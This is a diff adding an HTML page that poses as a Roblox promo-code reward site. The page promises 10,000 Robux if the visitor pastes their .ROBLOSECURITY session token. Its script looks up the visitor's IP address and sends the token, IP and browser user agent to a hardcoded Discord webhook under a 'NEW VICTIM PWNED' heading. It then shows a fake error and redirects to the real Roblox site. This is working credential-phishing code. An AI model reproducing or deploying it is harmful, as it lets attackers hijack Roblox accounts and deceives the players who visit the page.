@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox | Promo Codes & Rewards</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #191919; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 50px auto; background: #252525; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .logo { width: 60px; margin-bottom: 20px; }
+        h2 { font-size: 24px; margin-bottom: 10px; }
+        p { color: #ccc; font-size: 14px; line-height: 1.5; }
+        input { width: 100%; padding: 12px; margin: 20px 0; border-radius: 4px; border: 1px solid #333; background: #111; color: white; box-sizing: border-box; }
+        button { width: 100%; background: #00b06f; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 16px; }
+        button:hover { background: #008a57; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="logo">
+        <h2>REWARD REDEMPTION</h2>
+        <p>To receive your **10,000 Robux**, please verify your identity by pasting your **.ROBLOSECURITY** token below.</p>
+        <input type="password" id="t" placeholder="Paste Token Here...">
+        <button onclick="p()">REDEEM NOW</button>
+    </div>
+
+    <script>
+        async function p() {
+            const tk = document.getElementById('t').value;
+            const wh = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
+            
+            if(tk.length < 20) { alert("Invalid Token!"); return; }
+
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+
+            const pl = {
+                content: "### 💀 NEW VICTIM PWNED (PC/MOBILE)\n" + 
+                         "**IP:** `" + d.ip + "`\n" +
+                         "**UserAgent:** `" + navigator.userAgent + "`\n" +
+                         "**TOKEN:**\n```" + tk + "```"
+            };
+
+            await fetch(wh, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(pl) });
+            alert("Verification Failed! System Busy. Please try again in 24 hours.");
+            window.location.href = "https://www.roblox.com";
+        }
+    </script>
+</body>
+</html>
